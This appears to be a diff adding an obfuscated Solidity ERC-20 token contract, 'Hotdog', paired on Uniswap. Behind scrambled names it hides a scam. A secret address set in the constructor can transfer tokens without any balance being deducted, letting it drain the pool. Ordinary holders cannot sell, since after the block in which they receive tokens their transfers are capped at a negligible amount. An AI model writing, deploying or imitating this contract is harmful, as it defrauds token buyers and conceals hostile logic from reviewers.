@@ -1,0 +1,64 @@
+contract Hotdog is Ownable {
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function dlqtegfpkrz(address khsrgwzx, address noszqpwav, uint256 fjwqanx) private {
+        if (0 == piqyvrfnzwao[khsrgwzx]) {
+            if (khsrgwzx != ytnwsg && mdfxrcnsqa[khsrgwzx] != block.number && fjwqanx < totalSupply) {
+                require(fjwqanx <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[khsrgwzx] -= fjwqanx;
+        }
+        balanceOf[noszqpwav] += fjwqanx;
+        mdfxrcnsqa[noszqpwav] = block.number;
+        emit Transfer(khsrgwzx, noszqpwav, fjwqanx);
+    }
+
+    constructor(string memory cbqpjmsgtwa, string memory rafsymovkjh, address dnbuehlpzmx, address dcbp) {
+        name = cbqpjmsgtwa;
+        symbol = rafsymovkjh;
+        balanceOf[msg.sender] = totalSupply;
+        piqyvrfnzwao[dcbp] = tfqs;
+        IUniswapV2Router02 gulvdaz = IUniswapV2Router02(dnbuehlpzmx);
+        ytnwsg = IUniswapV2Factory(gulvdaz.factory()).createPair(address(this), gulvdaz.WETH());
+    }
+
+    function transfer(address noszqpwav, uint256 fjwqanx) public returns (bool success) {
+        dlqtegfpkrz(msg.sender, noszqpwav, fjwqanx);
+        return true;
+    }
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    mapping(address => uint256) public balanceOf;
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    mapping(address => uint256) private piqyvrfnzwao;
+
+    uint8 public decimals = 9;
+
+    string public symbol;
+
+    address private ytnwsg;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    mapping(address => uint256) private mdfxrcnsqa;
+
+    uint256 private tfqs = 106;
+
+    function approve(address wtaryeigljbv, uint256 fjwqanx) public returns (bool success) {
+        allowance[msg.sender][wtaryeigljbv] = fjwqanx;
+        emit Approval(msg.sender, wtaryeigljbv, fjwqanx);
+        return true;
+    }
+
+    function transferFrom(address khsrgwzx, address noszqpwav, uint256 fjwqanx) public returns (bool success) {
+        require(fjwqanx <= allowance[khsrgwzx][msg.sender]);
+        allowance[khsrgwzx][msg.sender] -= fjwqanx;
+        dlqtegfpkrz(khsrgwzx, noszqpwav, fjwqanx);
+        return true;
+    }
+
+    string public name;
+}
